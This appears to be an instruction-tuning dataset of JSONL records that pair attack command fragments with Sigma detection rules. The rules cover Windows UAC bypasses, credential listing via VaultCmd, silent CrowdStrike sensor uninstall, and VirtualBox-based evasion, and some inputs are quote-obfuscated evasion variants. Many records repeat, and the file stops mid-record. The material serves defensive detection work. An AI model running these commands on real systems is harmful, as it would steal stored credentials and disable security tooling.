{"instruction": "Write Sigma rule to detect payload:", "input": "sdclt.exe", "output": "title: Potential UAC Bypass Via Sdclt.EXE\nid: 40f9af16-589d-4984-b78d-8c2aec023197\nstatus: test\ndescription: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/6\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'sdclt.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdclt.exe", "output": "title: Potential UAC Bypass Via Sdclt.EXE\nid: 40f9af16-589d-4984-b78d-8c2aec023197\nstatus: test\ndescription: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/6\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'sdclt.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdclt", "output": "title: Potential UAC Bypass Via Sdclt.EXE\nid: 40f9af16-589d-4984-b78d-8c2aec023197\nstatus: test\ndescription: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/6\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'sdclt.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdclt.exe", "output": "title: Potential UAC Bypass Via Sdclt.EXE\nid: 40f9af16-589d-4984-b78d-8c2aec023197\nstatus: test\ndescription: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.\nreferences:\n    - https://github.com/OTRF/detection-hackathon-apt29/issues/6\n    - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.md\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020-05-02\nmodified: 2024-12-01\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: 'sdclt.exe'\n        IntegrityLevel:\n            - 'High'\n            - 'S-1-16-12288' # High\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset.exe \\conhost.exe CONHOST.EXE", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset.exe \\conhost.exe \"CONHO\"ST.EXE", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset \\conhost CONHOST", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset.exe \\conhost.exe CONHOST.EXE", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset.exe", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"w\"\"s\"\"r\"\"e\"\"s\"\"e\"\"t\"\".\"\"e\"\"x\"\"e\"", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsreset.exe", "output": "title: Bypass UAC via WSReset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nrelated:\n    - id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n      type: obsolete\nstatus: test\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n    - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n    - https://www.activecyber.us/activelabs/windows-uac-bypass\n    - https://twitter.com/ReaQta/status/1222548288731217921\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community, Florian Roth\ndate: 2019-10-24\nmodified: 2022-05-13\ntags:\n    - attack.privilege-escalation\n    - attack.defense-evasion\n    - attack.t1548.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsreset.exe'\n    filter:\n        - Image|endswith: '\\conhost.exe'\n        - OriginalFileName: 'CONHOST.EXE'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown sub processes of Wsreset.exe\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-autoreconnect -connect -id:", "output": "title: Use of UltraVNC Remote Access Software\nid: 145322e4-0fd3-486b-81ca-9addc75736d8\nstatus: test\ndescription: An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1219/T1219.md\nauthor: frack113\ndate: 2022-10-02\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: VNCViewer\n        - Product: UltraVNC VNCViewer\n        - Company: UltraVNC\n        - OriginalFileName: VNCViewer.exe\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-autoreconnect \\\"-\\\"\\\"c\\\"\\\"o\\\"\\\"n\\\"\\\"n\\\"\\\"e\\\"\\\"c\\\"\\\"t\\\" -id:", "output": "title: Use of UltraVNC Remote Access Software\nid: 145322e4-0fd3-486b-81ca-9addc75736d8\nstatus: test\ndescription: An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1219/T1219.md\nauthor: frack113\ndate: 2022-10-02\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: VNCViewer\n        - Product: UltraVNC VNCViewer\n        - Company: UltraVNC\n        - OriginalFileName: VNCViewer.exe\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-autoreconnect -id: -connect", "output": "title: Use of UltraVNC Remote Access Software\nid: 145322e4-0fd3-486b-81ca-9addc75736d8\nstatus: test\ndescription: An adversary may use legitimate desktop support and remote access software,to establish an interactive command and control channel to target systems within networks\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1219/T1219.md\nauthor: frack113\ndate: 2022-10-02\ntags:\n    - attack.command-and-control\n    - attack.t1219.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: VNCViewer\n        - Product: UltraVNC VNCViewer\n        - Company: UltraVNC\n        - OriginalFileName: VNCViewer.exe\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WindowsSensor.exe /uninstall /quiet", "output": "title: Uninstall Crowdstrike Falcon Sensor\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: frack113\ndate: 2021-07-12\nmodified: 2023-03-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\WindowsSensor.exe'\n            - ' /uninstall'\n            - ' /quiet'\n    condition: selection\nfalsepositives:\n    - Administrator might leverage the same command line for debugging or other purposes. However this action must be always investigated\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WindowsSensor.exe /uninstall /\"q\"\"u\"\"i\"\"e\"\"t\"", "output": "title: Uninstall Crowdstrike Falcon Sensor\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: frack113\ndate: 2021-07-12\nmodified: 2023-03-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\WindowsSensor.exe'\n            - ' /uninstall'\n            - ' /quiet'\n    condition: selection\nfalsepositives:\n    - Administrator might leverage the same command line for debugging or other purposes. However this action must be always investigated\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WindowsSensor /uninstall /quiet", "output": "title: Uninstall Crowdstrike Falcon Sensor\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: frack113\ndate: 2021-07-12\nmodified: 2023-03-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\WindowsSensor.exe'\n            - ' /uninstall'\n            - ' /quiet'\n    condition: selection\nfalsepositives:\n    - Administrator might leverage the same command line for debugging or other purposes. However this action must be always investigated\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WindowsSensor.exe /uninstall /quiet", "output": "title: Uninstall Crowdstrike Falcon Sensor\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: frack113\ndate: 2021-07-12\nmodified: 2023-03-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\WindowsSensor.exe'\n            - ' /uninstall'\n            - ' /quiet'\n    condition: selection\nfalsepositives:\n    - Administrator might leverage the same command line for debugging or other purposes. However this action must be always investigated\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VaultCmd.exe VAULTCMD.EXE /listcreds:", "output": "title: Windows Credential Manager Access via VaultCmd\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nstatus: test\ndescription: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nauthor: frack113\ndate: 2022-04-08\nmodified: 2022-05-13\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VaultCmd.exe VAULTC\"MD.EXE\" /listcreds:", "output": "title: Windows Credential Manager Access via VaultCmd\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nstatus: test\ndescription: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nauthor: frack113\ndate: 2022-04-08\nmodified: 2022-05-13\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VaultCmd VAULTCMD /listcreds:", "output": "title: Windows Credential Manager Access via VaultCmd\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nstatus: test\ndescription: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nauthor: frack113\ndate: 2022-04-08\nmodified: 2022-05-13\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\VaultCmd.exe VAULTCMD.EXE /listcreds:", "output": "title: Windows Credential Manager Access via VaultCmd\nid: 58f50261-c53b-4c88-bd12-1d71f12eda4c\nstatus: test\ndescription: List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd\nauthor: frack113\ndate: 2022-04-08\nmodified: 2022-05-13\ntags:\n    - attack.credential-access\n    - attack.t1555.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\verclsid.exe verclsid.exe /S /C", "output": "title: Verclsid.exe Runs COM Object\nid: d06be4b9-8045-428b-a567-740a26d9db25\nstatus: test\ndescription: Detects when verclsid.exe is used to run COM object via GUID\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Verclsid/\n    - https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5\n    - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\verclsid.exe'\n        - OriginalFileName: 'verclsid.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/S'\n            - '/C'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\verclsid verclsid /S /C", "output": "title: Verclsid.exe Runs COM Object\nid: d06be4b9-8045-428b-a567-740a26d9db25\nstatus: test\ndescription: Detects when verclsid.exe is used to run COM object via GUID\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Verclsid/\n    - https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5\n    - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\verclsid.exe'\n        - OriginalFileName: 'verclsid.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/S'\n            - '/C'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\verclsid.exe verclsid.exe /S /C", "output": "title: Verclsid.exe Runs COM Object\nid: d06be4b9-8045-428b-a567-740a26d9db25\nstatus: test\ndescription: Detects when verclsid.exe is used to run COM object via GUID\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Verclsid/\n    - https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5\n    - https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\verclsid.exe'\n        - OriginalFileName: 'verclsid.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/S'\n            - '/C'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "VBoxRT.dll,RTR3Init VBoxC.dll VBoxDrv.sys startvm controlvm", "output": "title: Detect Virtualbox Driver Installation OR Starting Of VMs\nid: bab049ca-7471-4828-9024-38279a4c04da\nstatus: test\ndescription: Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.\nreferences:\n    - https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\n    - https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/\nauthor: Janantha Marasinghe\ndate: 2020-09-26\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.006\n    - attack.t1564\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'VBoxRT.dll,RTR3Init'\n            - 'VBoxC.dll'\n            - 'VBoxDrv.sys'\n    selection_2:\n        CommandLine|contains:\n            - 'startvm'\n            - 'controlvm'\n    condition: 1 of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - This may have false positives on hosts where Virtualbox is legitimately being used for operations\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "VBoxRT.dll,RTR3Init VBoxC.dll VBoxDrv.sys startvm \"controlvm\"", "output": "title: Detect Virtualbox Driver Installation OR Starting Of VMs\nid: bab049ca-7471-4828-9024-38279a4c04da\nstatus: test\ndescription: Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.\nreferences:\n    - https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\n    - https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/\nauthor: Janantha Marasinghe\ndate: 2020-09-26\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.006\n    - attack.t1564\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'VBoxRT.dll,RTR3Init'\n            - 'VBoxC.dll'\n            - 'VBoxDrv.sys'\n    selection_2:\n        CommandLine|contains:\n            - 